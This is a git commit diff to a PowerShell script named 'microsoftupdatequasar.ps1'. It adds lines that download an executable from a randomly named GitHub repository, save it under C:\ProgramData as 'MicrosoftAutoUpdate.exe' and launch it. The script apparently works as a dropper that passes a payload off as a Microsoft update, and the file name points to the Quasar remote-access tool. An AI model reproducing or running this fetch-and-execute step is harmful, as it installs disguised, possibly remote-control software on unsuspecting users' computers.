d45bca2b789bec92d1c9244d1ba6bdfd5be8e920
ErrorLoadingUsername-404 <101419715+ErrorLoadingUsername-404@users.noreply.github.com>
2022-07-01 06:44:36 -0700

    Update microsoftupdatequasar.ps1

--- microsoftupdatequasar.ps1
+++ microsoftupdatequasar.ps1
@@ -1,3 +1,7 @@
 cd C:\programdata\zdataxd
 mkdir quasar
 cd quasar
+$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/MicrosoftAutoUpdate.exe'
+$destination = 'C:\ProgramData\zDATAxD\quasar\MicrosoftAutoUpdate.exe'
+Invoke-WebRequest -Uri $source -OutFile $destination
+start C:\programdata\zdataxd\quasar\MicrosoftAutoUpdate.exe
